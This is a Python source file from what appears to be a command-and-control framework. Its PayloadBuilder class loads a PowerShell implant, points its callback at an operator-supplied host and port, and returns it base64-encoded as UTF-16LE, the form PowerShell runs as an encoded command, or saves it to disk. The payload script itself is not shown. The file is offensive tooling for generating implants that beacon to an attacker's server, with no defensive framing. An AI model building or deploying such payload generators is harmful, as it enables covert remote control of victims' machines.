import os
import base64
from pathlib import Path
from settings import Settings


class PayloadBuilder:
    """
    Builder class for customizing and generating payloads
    """

    def __init__(self, base_path=None):
        if base_path is None:
            # root dir
            self.base_path = Path(
                os.path.dirname(
                    os.path.dirname(os.path.dirname(os.path.dirname(__file__)))
                )
            )
        else:
            self.base_path = Path(base_path)

        # path to the main payload
        self.main_payload_path = self.base_path / "payload" / "main.ps1"

    def read_base_payload(self):
        """
        Read the base payload file
        """
        try:
            with open(self.main_payload_path, "r") as file:
                return file.read()
        except Exception as e:
            raise Exception(f"Failed to read base payload: {str(e)}")

    def build_custom_payload(self, hostname_port):
        """
        Build a customized payload with the specified hostname:port

        Args:
            hostname_port (str): The hostname:port to use in the payload

        Returns:
            str: The customized payload code
        """
        try:
            payload_content = self.read_base_payload()

            modified_payload = payload_content.replace(
                '$global:ip_port = "127.0.0.1:5000"',
                f'$global:ip_port = "{hostname_port}"',
            )

            if Settings.debug:
                modified_payload = modified_payload.replace(
                    "https://$global:ip_port", "http://$global:ip_port"
                )

            return modified_payload
        except Exception as e:
            raise Exception(f"Failed to build custom payload: {str(e)}")

    def get_payload_as_base64(self, hostname_port):
        """
        Get the customized payload encoded as Base64 (UTF-16LE)

        Args:
            hostname_port (str): The hostname:port to use in the payload

        Returns:
            str: Base64-encoded payload in UTF-16LE
        """
        payload = self.build_custom_payload(hostname_port)
        return base64.b64encode(payload.encode("utf-16le")).decode("utf-8")

    def save_custom_payload(self, hostname_port, output_path=None):
        """
        Save the customized payload to a file

        Args:
            hostname_port (str): The hostname:port to use in the payload
            output_path (str, optional): Path to save the file. If None, a default path is used.

        Returns:
            str: Path to the saved file
        """
        payload = self.build_custom_payload(hostname_port)

        if output_path is None:
            output_path = self.base_path / "payload" / "generated" / f"out.ps1"

            # Ensure directory exists
            os.makedirs(os.path.dirname(output_path), exist_ok=True)

        with open(output_path, "w") as file:
            file.write(payload)

        return str(output_path)
